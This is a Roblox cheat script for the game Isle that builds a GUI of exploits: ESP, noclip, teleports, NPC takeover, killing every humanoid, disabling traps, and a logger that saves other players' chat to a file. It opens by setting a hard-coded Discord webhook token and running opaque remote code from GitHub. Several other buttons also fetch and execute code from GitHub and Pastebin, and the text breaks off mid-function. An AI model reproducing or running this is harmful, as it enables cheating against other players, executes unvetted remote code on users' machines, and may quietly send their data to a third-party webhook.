if game.PlaceId == 3431407618 then

_G.WebhookURL = "https://discord.com/api/webhooks/797650802964430869/bTs_CKwR9t-CjLT31h4b_upJZFod7_S5p3X4tRJtXkEIr29bubXKdWjHrv-bzrgxrrHy";
EmbedColor = "16763904"; -- Color from Discohook.org. / It's an Decimal color. Use https://convertingcolors.com do convert color to Decimal color.

loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/server"))('Made by powerless :)')


local Isle = {}
function Isle:AddNotification(Text, R, G, B)
if game.PlaceId == 3431407618 then
local alert = Instance.new('Color3Value')
alert.Name = Text
alert.Parent = game.Players.LocalPlayer.Character["@Alerts"]
alert.Value = Color3.fromRGB(255, 255, 255)
for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Game.Alert:GetChildren()) do
    if v.Text == alert.Name then
        v.TextColor3 = Color3.fromRGB(R, G, B)
end
end
elseif game.PlaceId == 3095204897 then
local alert = Instance.new('Color3Value')
alert.Name = Text
alert.Parent = game.Players.LocalPlayer.Character["@Alerts"]
alert.Value = Color3.fromRGB(255, 255, 255)
for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Alert.Alert:GetChildren()) do
    if v.Text == alert.Name then
        v.TextColor3 = Color3.fromRGB(R, G, B)
end
end
end
end

Isle:AddNotification("Made by NeoXephox, read page 1 for more info!", 255, 255, 255)

if game.CoreGui:FindFirstChild('IsleGUI [ Isle ] :)') then
game.CoreGui['IsleGUI [ Isle ] :)']:Destroy()
end
if game.CoreGui:FindFirstChild("LogHolder") then
game.CoreGui.LogHolder:Destroy()
end


local LogHolder = Instance.new("ScreenGui")
local Logs = Instance.new("Frame")
local Scroll = Instance.new("ScrollingFrame")
local Template = Instance.new("TextLabel")

LogHolder.Name = "LogHolder"
if game:service('RunService'):IsStudio() then LogHolder.Parent = game.Players.LocalPlayer.PlayerGui else
	LogHolder.Parent = game.CoreGui
end

Logs.Name = "Logs"
Logs.Parent = LogHolder
Logs.AnchorPoint = Vector2.new(0.5, 0.5)
Logs.BackgroundColor3 = Color3.new(1, 1, 1)
Logs.Position = UDim2.new(0.200000003, 0, 0.200000003, 0)
Logs.Size = UDim2.new(0, 400, 0, 250)
Logs.Style = Enum.FrameStyle.DropShadow

Scroll.Name = "Scroll"
Scroll.Parent = Logs
Scroll.BackgroundColor3 = Color3.new(1, 1, 1)
Scroll.BackgroundTransparency = 1
Scroll.BorderSizePixel = 0
Scroll.Size = UDim2.new(1, 0, 1, 0)
Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
Scroll.ScrollBarThickness = 6

Template.Name = "Template"
Template.Parent = Logs
Template.BackgroundColor3 = Color3.new(1, 1, 1)
Template.BackgroundTransparency = 1
Template.Position = UDim2.new(0, 0, 0, -25)
Template.Size = UDim2.new(1, 0, 0, 20)
Template.Font = Enum.Font.ArialBold
Template.Text = ""
Template.TextColor3 = Color3.new(1, 1, 1)
Template.TextSize = 15
Template.TextXAlignment = Enum.TextXAlignment.Left
Template.TextWrap = true

Logs.Active = true
Logs.Draggable = true

local loggedTable = {}

local getTotalSize = function()
local totalSize = UDim2.new(0, 0, 0, 0)
	
	for i, v in next, loggedTable do
		totalSize = totalSize + UDim2.new(0, 0, 0, v.Size.Y.Offset)
	end
	
	return totalSize
end

local BUD = UDim2.new(0, 0, 0, 0)
local TotalNum = 0

local function GenLog(txt, colo, time)
	local oldColo = Color3.fromRGB(0, 0, 0)	
	
	local Temp = Template:Clone()
	Temp.Parent = Scroll
	Temp.Name = txt..'Logged'
	Temp.Text = tostring(txt)
	Temp.Visible = true
	Temp.Position = BUD + UDim2.new(0, 0, 0, 0)
	if colo then oldColo = colo Temp.TextColor3 = colo elseif not colo then Temp.TextColor3 = Color3.fromRGB(200, 200, 200) end

	local timeVal = Instance.new('StringValue', Temp)
	timeVal.Name = 'TimeVal'
	timeVal.Value = time

	TotalNum = TotalNum + 1
	
	if not Temp.TextFits then repeat Temp.Size = UDim2.new(Temp.Size.X.Scale, Temp.Size.X.Offset, Temp.Size.Y.Scale, Temp.Size.Y.Offset + 10)
		Temp.Text = txt
	until Temp.TextFits 
end

	BUD = BUD + UDim2.new(0, 0, 0, Temp.Size.Y.Offset)
	
	table.insert(loggedTable, Temp)
	
	local totSize = getTotalSize()
	
	if totSize.Y.Offset >= Scroll.CanvasSize.Y.Offset then Scroll.CanvasSize = UDim2.new(totSize.X.Scale, totSize.X.Offset, totSize.Y.Scale, totSize.Y.Offset + 100)
	Scroll.CanvasPosition = Scroll.CanvasPosition + Vector2.new(0, totSize.Y.Offset) 
	end
	
	return Temp
end

local ChatData = ""

local function SaveToFile()
	local t = os.date("*t")
	local dateDat = t['hour']..' '..t['min']..' '..t['sec']..' '..t['day']..'.'..t['month']..'.'..t['year']
	
	ChatData = ""
	
	for i, v in pairs(Scroll:GetChildren()) do
		ChatData = ChatData..v.TimeVal.Value..' '..v.Text..'\n'
	end
	
	writefile('ChatLogs '..dateDat..'.txt', ChatData)
end


local function Clear()
	loggedTable = {}
	ChatData = ""
	Scroll.CanvasPosition = Vector2.new(0, 0)
	for i, v in pairs(Scroll:GetChildren()) do
		v:Destroy()
	end
	Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	BUD = UDim2.new(0, 0, 0, 0)
end

local LogPlr = function(plr)
			plr.Chatted:connect(function(msg)
				
			local t = os.date("*t")
			local dateDat = t['hour']..':'..t['min']..':'..t['sec']
	
			if string.len(msg) >= 1000 then return nil end
			if string.lower(msg) == 'clear' and plr == game:service('Players').LocalPlayer then Clear() return nil end
			if string.lower(msg) == 'savetofile' and plr == game:service('Players').LocalPlayer then SaveToFile() return nil end
			if string.sub(msg, 1, 1):match('%p') and string.sub(msg, 2, 2):match('%a') and string.len(msg) >= 5 then GenLog(plr.Name..': '..msg, Color3.new(255, 0, 0), dateDat) else
			GenLog(plr.Name..': '..msg, Color3.new(255, 255, 255), dateDat)
			end
	end)
end

for i, v in pairs(game.Players:GetChildren()) do
	LogPlr(v)
end

game.Players.PlayerAdded:connect(function(plr)
	LogPlr(plr)
end)


local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/hoootototott/main/venyx"))()
local venyx = library.new("IsleGUI [ Isle ] :)", 5013109572)
local themes = {
	Background = Color3.fromRGB(24, 24, 24),
	Glow = Color3.fromRGB(0, 0, 0),
	Accent = Color3.fromRGB(10, 10, 10),
	LightContrast = Color3.fromRGB(20, 20, 20),
	DarkContrast = Color3.fromRGB(14, 14, 14),
	TextColor = Color3.fromRGB(255, 255, 255)
}
local page1 = venyx:addPage("Welcome", 5012544693)
local section1 = page1:addSection("Welcome!")
section1:addButton("Copy discord invite", function()
setclipboard("https://discord.gg/XPBhUptGrd")
end)
section1:addButton("Scripts made by NeoXephox#3061!", function()
end)

local woala = page1:addSection("Keybinds")



woala:addKeybind("Toggle Keybind", Enum.KeyCode.RightControl, function()
	venyx:toggle()
end)

local exist = isfile("IsleGUI.counter")
if exist then
getgenv().content = readfile("IsleGUI.counter")
writefile("IsleGUI.counter", content+1)
else
writefile("IsleGUI.counter", 0)
end
local counter = readfile("IsleGUI.counter").. " Time(s) executed"

section1:addButton("To use infinite jump use infinite oxygen.", function()
end)
section1:addButton("B to turn on ESP and N to turn it off", function()
end)
section1:addButton("Don't move / hold Q when changing walkspeed", function()
end)
section1:addButton("After using NPC Control you can't shoot guns.", function()
end)
section1:addButton("Size is client sided.", function()
end)
section1:addButton("BHOP is just for fun.", function()
end)
section1:addButton(counter, function()
end)
section1:addButton("Version 7.3.4", function()
end)
local Scripts1 = venyx:addPage("Scripts", 5012544693)
local page2 = venyx:addPage("Stuff", 5012544693)
local sectiones2 = page2:addSection("Other")
local sectiones23343 = page2:addSection("Print Stuff")

sectiones2:addButton("BHOP", function()
if not getgenv().MTAPIMutex then loadstring(game:HttpGet("https://pastebin.com/raw/UwFCVrhS", true))() end


game.Players.LocalPlayer.Character.Humanoid:AddPropertyEmulator("WalkSpeed")
local UIS = game:GetService("UserInputService")

local BhopInfo = {
   CurrentVel = 3, -- DONT TOUCH
   VelCap = 700,
   JumpBoostAmt = 0.1
}

local helper = {
   getChar = function()
       return game.Players.LocalPlayer.Character
   end
}

local function checkOnGround(char)
   local ray = Ray.new(char.HumanoidRootPart.Position,-(char.HumanoidRootPart.CFrame.UpVector * 100))
   local part, pos = workspace:FindPartOnRay(ray,char)
   
   if part then
       if pos then
           local farness = math.ceil((char.HumanoidRootPart.Position - pos).Magnitude)
           if farness > 3 then    -- works with normal blocky r15 avatars.. sooo :l
               return false
           elseif farness <= 3 then
               return true
           end
       end
   end
end



UIS.JumpRequest:Connect(function()
   if (UIS:IsKeyDown(Enum.KeyCode.W) == false) and (UIS:IsKeyDown(Enum.KeyCode.A) or UIS:IsKeyDown(Enum.KeyCode.D)) == true and BhopInfo.CurrentVel < BhopInfo.VelCap then
       BhopInfo.CurrentVel = BhopInfo.CurrentVel + BhopInfo.JumpBoostAmt
   end
end)

spawn(function() -- spawn, wait, delay, and Debris are ALL SO BAD. NEVER RELY ON THEM. I am relying on them though because this is a exploit script, not much effort put into it
   while true do
       local char = helper.getChar()
   
       if checkOnGround(char) == false and BhopInfo.CurrentVel ~= 0 then
           char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + (char.HumanoidRootPart.CFrame.LookVector * BhopInfo.CurrentVel/6)
           print('hopping')
       end

       if UIS:IsKeyDown(Enum.KeyCode.Space) == false then
           BhopInfo.CurrentVel = 0
       elseif UIS:IsKeyDown(Enum.KeyCode.Space) == true and UIS:IsKeyDown(Enum.KeyCode.W) then
           BhopInfo.CurrentVel = math.clamp(BhopInfo.CurrentVel - 0.01,0,BhopInfo.VelCap)
       end
   
       game:GetService("RunService").Stepped:Wait()
   end
end)
end)

sectiones2:addButton("Load ESP", function()
    -- Options for ESP
_G.options = {
     ["Hunters"] = true,
     ["Traps"] = true,
     ["Items"] = true,
     ["Threats"] = true, -- Serpent, Turrets, etc.
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/yeok", true))()
end)
sectiones23343:addButton("Print Player Inventories", function()
    for i,v in pairs(game.Players:GetDescendants()) do
            if v.Name:find("Fire") then
                if v.Parent.Parent.Parent.ClassName == 'Player' then
                        
                    local firenamebroo = v.Parent.Parent.Parent.Name
                    print("Here is what ".. firenamebroo.. " has:")
                    for i,v in pairs(v.Parent.Parent.Parent.Backpack:GetChildren()) do
                    warn(v.Name)
                end
            end
            end
end
end)


sectiones2:addButton("Max Slope Angles", function()
while true do
    wait(0.1)
    if game.Players.LocalPlayer.Character:FindFirstChild("DeathReturn") then
        game.Players.LocalPlayer.Character.Humanoid.MaxSlopeAngle = 89.9
   end
end
end)
sectiones2:addButton("Max Camera Zoom", function()
	game.Players.LocalPlayer.CameraMaxZoomDistance = 1000000000000
end)

sectiones2:addButton("Add no colide trees", function()
	game:GetService("ReplicatedStorage").NoCollideTrees.Parent = game:GetService("Workspace")
end)

sectiones2:addButton("Remove no colide trees", function()
	game:GetService("Workspace").NoCollideTrees.Parent = game.ReplicatedStorage
end)

sectiones2:addButton("Improve Graphics (Sunny)", function()
    -- Roblox Graphics Enhancher
_G.FullBrightEnabled = false
sethiddenproperty(game:GetService("Workspace").Terrain, "Decoration", true)
sethiddenproperty(game:GetService("Lighting"), "Technology", "Future")
local light = game.Lighting
for i, v in pairs(light:GetChildren()) do
	v:Destroy()
end

local ter = workspace.Terrain
local color = Instance.new("ColorCorrectionEffect")
local bloom = Instance.new("BloomEffect")
local sun = Instance.new("SunRaysEffect")
local blur = Instance.new("BlurEffect")

color.Parent = light
bloom.Parent = light
sun.Parent = light
blur.Parent = light

-- enable or disable shit

local config = {

	Terrain = true;
	ColorCorrection = true;
	Sun = true;
	Lighting = true;
	BloomEffect = true;
	
}

-- settings {

color.Enabled = false
color.Contrast = 0.15
color.Brightness = 0.1
color.Saturation = 0.25
color.TintColor = Color3.fromRGB(255, 222, 211)

bloom.Enabled = false
bloom.Intensity = 0.1

sun.Enabled = false
sun.Intensity = 0.2
sun.Spread = 1

bloom.Enabled = false
bloom.Intensity = 0.05
bloom.Size = 32
bloom.Threshold = 1

blur.Enabled = false
blur.Size = 6

-- settings }


if config.ColorCorrection then
	color.Enabled = true
end


if config.Sun then
	sun.Enabled = true
end


if config.Terrain then
	-- settings {
	ter.WaterWaveSize = 0.1
	ter.WaterWaveSpeed = 22
	ter.WaterTransparency = 0.9
	ter.WaterReflectance = 0.05
	-- settings }
end


if config.Lighting then
	-- settings {
	light.Ambient = Color3.fromRGB(0, 0, 0)
	light.Brightness = 4
	light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	light.ExposureCompensation = 0
	light.FogColor = Color3.fromRGB(132, 132, 132)
	light.GlobalShadows = true
	light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
	light.Outlines = false
	-- settings }
end
end)
sectiones2:addButton("Improve Graphics (Cold)", function()
sethiddenproperty(game:GetService("Workspace").Terrain, "Decoration", false)
sethiddenproperty(game:GetService("Lighting"), "Technology", "Future")
local light = game.Lighting
for i, v in pairs(light:GetChildren()) do
	v:Destroy()
end
_G.FullBrightEnabled = false
end)
sectiones23343:addTextbox("Print Player Kills", "Default", function(value, focusLost)

if focusLost then
local pwlayer = value
local killedvalue = game.Workspace.GameState.Statistics[pwlayer]["Players Killed"].Value


    print("The player you are trying to check does not exist!")
print(pwlayer.. " has killed ".. killedvalue.. " players.")
end
end)
local Isle929 = venyx:addPage("Misc", 5012544693)
local isl129391 = venyx:addPage("Size", 5012544693)
local Scripts = Scripts1:addSection("Options")
local Scrip33ts = Scripts1:addSection("Other")
local Isle999 = Isle929:addSection("Options")
local isle192312948 = isl129391:addSection("Options")
local Isle92399 = Isle929:addSection("Toggles")





Scripts:addButton("IY", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

Scripts:addButton("NPC Control", function()
spawn(function()
  while wait() do
    game.Players.LocalPlayer.MaximumSimulationRadius = math.huge;
    setsimulationradius(math.huge);
  end
end)

local OGPN = game.Players.LocalPlayer.Name
local Player = game.Players.LocalPlayer
local Mouse = Player:GetMouse()
Mouse.Button1Down:connect(function()
  if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) and Mouse.Target ~= nil and Mouse.Target.Parent.Name ~= "Workspace" and Mouse.Target.Parent:FindFirstChildOfClass("Humanoid") ~= nil then
    local Char = Mouse.Target.Parent
    Player.Character = Mouse.Target.Parent
    workspace.CurrentCamera.CameraSubject = Char
    Char.Animate.Disabled = true
   wait(0.1)
    Char.Animate.Disabled = false
  end
end)

Mouse.KeyDown:connect(function()
  if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.Quote) then
    for i,v in pairs(game.Workspace:GetDescendants()) do
      if v.Name == OGPN then
        local Char = v
        Player.Character = v
        workspace.CurrentCamera.CameraSubject = Char
        Char.Animate.Disabled = true
       wait(0.1)
        Char.Animate.Disabled = false
      end
    end
  end
end)
end)



Scripts:addButton("Death Return", function()
while true do
    wait(0.1)
    if game.Players.LocalPlayer.Character:FindFirstChild("DeathReturn") then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/death"))('death is such a noob :)')
end
end
end)

Scripts:addButton("Remove corruption", function()
            game:GetService("Players").LocalPlayer.Character["#Corrupt"].Handle.Trail:Destroy()
            game:GetService("Players").LocalPlayer.Character["#Corrupt"].Handle.Trail2:Destroy()
            game:GetService("Players").LocalPlayer.Character["#Corrupt"].Handle.A:Destroy()
            game:GetService("Players").LocalPlayer.Character["#Corrupt"].Handle.B:Destroy()
end)

Scripts:addButton("Player Died Alerts", function()
local players = game:GetService("Players")

players.PlayerRemoving:Connect(function(player)
    game.StarterGui:SetCore("SendNotification", {
Title = "Player Died"; -- the title (ofc)
Text =  player.Name;
Icon = "rbxassetid://0"; -- the image if u want. 
Duration = 5;
})
end)
end)






Isle999:addButton("Print Portal Email", function()
	local e = game.Workspace.ObservatoryComputer.Monitor.SurfaceGui.Email["6"].Message2.Text
	print(e)
end)

Isle999:addButton("Kill mercenaries", function()
local Player = game.Players.LocalPlayer
for index, value in next, workspace:GetDescendants() do
if (value:FindFirstChildOfClass("Humanoid") and value ~= Player.Character) then
value.Humanoid.Health = 0
end
end
end)
Isle999:addButton("Orbital Strike", function()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1584.68, -10.015, 986.675)
    wait(2)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(701.994, 31.072, -1438.36)
    wait(3)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2252.09, 1.17687, -777.851)
    wait(4)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-360.747, -39.492, 1169.68)
    wait(5)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-562.794, 189.13, -1225.34)
    wait(.1)
end)
Isle999:addButton("Anti-Stan", function()
game.Workspace.Monster.A.Humanoid.Health = 0
game.Workspace.Monster.A.Humanoid.BreakJointsOnDeath = true
end)
Isle999:addButton("Fullbright", function()
	local Light = game:GetService("Lighting")
	function dofullbright()
		Light.Ambient = Color3.new(1, 1, 1)
		Light.ColorShift_Bottom = Color3.new(1, 1, 1)
		Light.ColorShift_Top = Color3.new(1, 1, 1)
	end
	dofullbright()
	Light.LightingChanged:Connect(dofullbright)
end)
Isle999:addButton("R15 FE Gui", function()
-- Objects

local phemzyxR15 = Instance.new("ScreenGui")
local Topbar = Instance.new("Frame")
local menu = Instance.new("Frame")
local fe = Instance.new("TextLabel")
local R15 = Instance.new("TextButton")
local Separator = Instance.new("TextButton")
local rh = Instance.new("TextButton")
local lh = Instance.new("TextButton")
local rlarm = Instance.new("TextButton")
local llarm = Instance.new("TextButton")
local fe_2 = Instance.new("TextLabel")
local invis = Instance.new("TextButton")
local cut = Instance.new("TextButton")
local title = Instance.new("TextLabel")

-- Properties

phemzyxR15.Name = "phemzyxR15"
phemzyxR15.Parent = game.CoreGui

Topbar.Name = "Topbar"
Topbar.Parent = phemzyxR15
Topbar.Active = true
Topbar.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Topbar.BorderColor3 = Color3.new(1, 0, 0)
Topbar.BorderSizePixel = 2
Topbar.Draggable = true
Topbar.Position = UDim2.new(0.4375, -100, 0.499388754, -13)
Topbar.Selectable = true
Topbar.Size = UDim2.new(0, 362, 0, 27)

menu.Name = "menu"
menu.Parent = Topbar
menu.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
menu.BorderColor3 = Color3.new(1, 0, 0)
menu.BorderSizePixel = 2
menu.Position = UDim2.new(0, 0, 0, 27)
menu.Size = UDim2.new(0, 362, 0, 200)

fe.Name = "fe"
fe.Parent = menu
fe.BackgroundColor3 = Color3.new(1, 1, 1)
fe.BackgroundTransparency = 1
fe.Position = UDim2.new(0, 279, 0, -27)
fe.Size = UDim2.new(0, 83, 0, 27)
fe.Font = Enum.Font.ArialBold
fe.FontSize = Enum.FontSize.Size14
fe.Text = "FE IS ON"
fe.TextColor3 = Color3.new(1, 1, 1)
fe.TextSize = 13

R15.Name = "R15"
R15.Parent = menu
R15.BackgroundColor3 = Color3.new(0.247059, 0, 0)
R15.BorderColor3 = Color3.new(1, 0, 0)
R15.Size = UDim2.new(0, 51, 0, 25)
R15.Font = Enum.Font.SourceSans
R15.FontSize = Enum.FontSize.Size14
R15.Text = "R15"
R15.TextColor3 = Color3.new(1, 1, 1)
R15.TextSize = 14

Separator.Name = "Separator"
Separator.Parent = menu
Separator.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Separator.BorderColor3 = Color3.new(1, 0, 0)
Separator.Position = UDim2.new(0, 0, 0.136000007, 0)
Separator.Selectable = false
Separator.Size = UDim2.new(0, 362, 0, 0)
Separator.Font = Enum.Font.SourceSans
Separator.FontSize = Enum.FontSize.Size14
Separator.Text = ""
Separator.TextColor3 = Color3.new(1, 1, 1)
Separator.TextSize = 14

rh.Name = "rh"
rh.Parent = menu
rh.BackgroundColor3 = Color3.new(0.133333, 0, 0)
rh.BorderColor3 = Color3.new(1, 0, 0)
rh.Position = UDim2.new(0.0165745858, 0, 0.200000003, 0)
rh.Size = UDim2.new(0, 82, 0, 27)
rh.Font = Enum.Font.ArialBold
rh.FontSize = Enum.FontSize.Size12
rh.Text = "RIGHT HAND"
rh.TextColor3 = Color3.new(1, 1, 1)
rh.TextSize = 12

lh.Name = "lh"
lh.Parent = menu
lh.BackgroundColor3 = Color3.new(0.133333, 0, 0)
lh.BorderColor3 = Color3.new(1, 0, 0)
lh.Position = UDim2.new(0.243093923, 0, 0.200000003, 0)
lh.Size = UDim2.new(0, 82, 0, 27)
lh.Font = Enum.Font.ArialBold
lh.FontSize = Enum.FontSize.Size12
lh.Text = "LEFT HAND"
lh.TextColor3 = Color3.new(1, 1, 1)
lh.TextSize = 12

rlarm.Name = "rlarm"
rlarm.Parent = menu
rlarm.BackgroundColor3 = Color3.new(0.133333, 0, 0)
rlarm.BorderColor3 = Color3.new(1, 0, 0)
rlarm.Position = UDim2.new(0.0165745914, 0, 0.335000008, 0)
rlarm.Size = UDim2.new(0, 82, 0, 27)
rlarm.Font = Enum.Font.ArialBold
rlarm.FontSize = Enum.FontSize.Size12
rlarm.Text = "RIGHT LOWER ARM"
rlarm.TextColor3 = Color3.new(1, 1, 1)
rlarm.TextSize = 12
rlarm.TextWrapped = true

llarm.Name = "llarm"
llarm.Parent = menu
llarm.BackgroundColor3 = Color3.new(0.133333, 0, 0)
llarm.BorderColor3 = Color3.new(1, 0, 0)
llarm.Position = UDim2.new(0.243093923, 0, 0.335000008, 0)
llarm.Size = UDim2.new(0, 82, 0, 27)
llarm.Font = Enum.Font.ArialBold
llarm.FontSize = Enum.FontSize.Size12
llarm.Text = "LEFT LOWER ARM"
llarm.TextColor3 = Color3.new(1, 1, 1)
llarm.TextSize = 12
llarm.TextWrapped = true

fe_2.Name = "fe"
fe_2.Parent = menu
fe_2.BackgroundColor3 = Color3.new(1, 1, 1)
fe_2.BackgroundTransparency = 1
fe_2.Position = UDim2.new(0, 51, 0, 138)
fe_2.Size = UDim2.new(0, 73, 0, 27)
fe_2.Font = Enum.Font.ArialBold
fe_2.FontSize = Enum.FontSize.Size14
fe_2.Text = "more coming soon.."
fe_2.TextColor3 = Color3.new(1, 1, 1)
fe_2.TextSize = 13

invis.Name = "invis"
invis.Parent = menu
invis.BackgroundColor3 = Color3.new(0.133333, 0, 0)
invis.BorderColor3 = Color3.new(1, 0, 0)
invis.Position = UDim2.new(0.585635364, 0, 0.200000003, 0)
invis.Size = UDim2.new(0, 122, 0, 54)
invis.Font = Enum.Font.ArialBold
invis.FontSize = Enum.FontSize.Size18
invis.Text = "INVISIBLE"
invis.TextColor3 = Color3.new(1, 1, 1)
invis.TextSize = 16
invis.TextWrapped = true

cut.Name = "cut"
cut.Parent = menu
cut.BackgroundColor3 = Color3.new(0.133333, 0, 0)
cut.BorderColor3 = Color3.new(1, 0, 0)
cut.Position = UDim2.new(0.585635364, 0, 0.470000029, 0)
cut.Size = UDim2.new(0, 122, 0, 54)
cut.Font = Enum.Font.ArialBold
cut.FontSize = Enum.FontSize.Size18
cut.Text = "CUT BODY IN HALF"
cut.TextColor3 = Color3.new(1, 1, 1)
cut.TextSize = 16
cut.TextWrapped = true

title.Name = "title"
title.Parent = Topbar
title.BackgroundColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 124, 0, 27)
title.Font = Enum.Font.Arial
title.FontSize = Enum.FontSize.Size18
title.Text = "GUI by Phemzyx"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 18

--Functions

lh.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.LeftHand.LeftWrist:Destroy()
end)

rh.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.RightHand.RightWrist:Destroy()
end)

llarm.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.LeftLowerArm.LeftElbow:Destroy()
end)

rlarm.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.RightLowerArm.RightElbow:Destroy()
end)

if game.Workspace.FilteringEnabled == true
then fe.Text = "FE IS ON"
else fe.Text = "FE IS OFF"
end

cut.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.UpperTorso.Waist:Destroy()
end)

invis.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.LowerTorso.Root:Destroy()
end)
end)
Scripts:addButton("Infinite Oxygen", function()
game.Players.LocalPlayer.Character.Diving:Destroy()
game.Players.LocalPlayer.Character.Humanoid.MaxSlopeAngle = 89.9
game.Players.LocalPlayer.CameraMaxZoomDistance = 1000000000000
wait(.1)
game.Players.LocalPlayer.PlayerGui.Game.Oxygen.Visible = false
getgenv().BlurToggle = true
game.Lighting.Blur.Enabled = BlurToggle
end)
Scripts:addButton("Random Teleport", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.SpecialRegions.Anomaly2.CFrame
end)


Scripts:addButton("Disable Mines", function()
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("ClickDetector") then
			fireclickdetector(v)
		end
	end
pcall(function()
game:GetService("Workspace").Guillotine.Trigger:Destroy()
game:GetService("Workspace").Guillotine.Trigger2:Destroy()
game:GetService("Workspace").Guillotine.Kill:Destroy()
game:GetService("Workspace").Turret.Trigger:Destroy()
game:GetService("Workspace").Turret.Script:Destroy()
for i,v in pairs(workspace:GetDescendants()) do
  if v.Name:find("TouchInterest") and v.Parent == 'Tripwire' then
    v:Destory()
end
end
end)
end)
Scrip33ts:addSlider("Walkspeed [Q]", 16, 16, 100, function(value)


	down = false
	velocity = Instance.new("BodyVelocity")
	velocity.maxForce = Vector3.new(100000, 0, 100000)
	local speed = (value)
	gyro = Instance.new("BodyGyro")
	gyro.maxTorque = Vector3.new(100000, 0, 100000)
	local hum = game.Players.LocalPlayer.Character.Humanoid
	function onButton1Down(mouse)
		down = true
		velocity.Parent = game.Players.LocalPlayer.Character.UpperTorso
		velocity.velocity = (hum.MoveDirection) * speed
		gyro.Parent = game.Players.LocalPlayer.Character.UpperTorso
		while down do
			if not down then
				break
			end
			velocity.velocity = (hum.MoveDirection) * speed
			local refpos = gyro.Parent.Position + (gyro.Parent.Position - workspace.CurrentCamera.CoordinateFrame.p).unit * 5
			gyro.cframe = CFrame.new(gyro.Parent.Position, Vector3.new(refpos.x, gyro.Parent.Position.y, refpos.z))
			wait(0.1)
		end
	end
	function onButton1Up(mouse)
		velocity.Parent = nil
		gyro.Parent = nil
		down = false
	end
	function onSelected(mouse)
		mouse.KeyDown:connect(function(k)
			if k:lower() == "q" then
				onButton1Down(mouse)
			end
		end)
		mouse.KeyUp:connect(function(k)
			if k:lower() == "q" then
				onButton1Up(mouse)
			end
		end)
	end
	onSelected(game.Players.LocalPlayer:GetMouse())
end)


Isle999:addButton("Noclip [V]", function()
	noclip = false
	game:GetService('RunService').Stepped:connect(function()
		if noclip then
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
		end
	end)
	plr = game.Players.LocalPlayer
	mouse = plr:GetMouse()
	mouse.KeyDown:connect(function(key)
		if key == "v" then
			noclip = not noclip
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
		end
	end)
	game.StarterGui:SetCore("SendNotification", {
		Title = "Welcome to IsleGUI noclip";
		Text = "Press V to noclip";
		Icon = "";
		Duration = 5
	})
end)

Scrip33ts:addToggle("Infinite Jump", nil, function(state)
	InfiniteJumpEnabled = (state)
	game:GetService("UserInputService").JumpRequest:connect(function()
		if InfiniteJumpEnabled then
			game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
		end
	end)
end)
Isle92399:addToggle("Sleep", nil, function(state)
SleepEnabled = (state)

if SleepEnabled then
    players = game:GetService("Players")
players.LocalPlayer.Character["SleepMode"].Value = true
wait(.1)
players.LocalPlayer.Character["SleepMode"].Value = false
else
players = game:GetService("Players")
wait(1)
players.LocalPlayer.Character["SleepMode"].Value = false
wait(.1)
players.LocalPlayer.Character["SleepMode"].Value = true
wait(2)
players.LocalPlayer.Character["SleepMode"].Value = false
end
end)


isle192312948:addSlider("Body Depth", 1, 1, 150, function(value)
game.Players.LocalPlayer.Character.Humanoid.BodyDepthScale.Value = (value)
end)

isle192312948:addSlider("Body Height", 1, 1, 150, function(value)
game.Players.LocalPlayer.Character.Humanoid.BodyHeightScale.Value = (value)
end)

isle192312948:addSlider("Body Width", 1, 1, 150, function(value)
game.Players.LocalPlayer.Character.Humanoid.BodyWidthScale.Value = (value)
end)

isle192312948:addSlider("Head Scale", 1, 1, 150, function(value)
game.Players.LocalPlayer.Character.Humanoid.HeadScale.Value = (value)
end)
local page4 = venyx:addPage("Teleports", 5012544693)
local secwe = page4:addSection("Options")
local page3 = venyx:addPage("Developer", 5012544693)
local sectiones6 = page3:addSection("README!")
local sectiones7 = page3:addSection("Items TP")
local sectiones8 = page3:addSection("Places TP")
for i, v in pairs(workspace.Tools:GetChildren()) do
	if v:FindFirstChild("Handle") then
		sectiones7:addButton(v.Name, function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Handle.CFrame
		end)
	end
end

secwe:addButton("Ship Teleport", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(264.43515, 20.2382774, 31333.4922, 0, 0, -1, 0, 1, 0, 1, 0, 0)
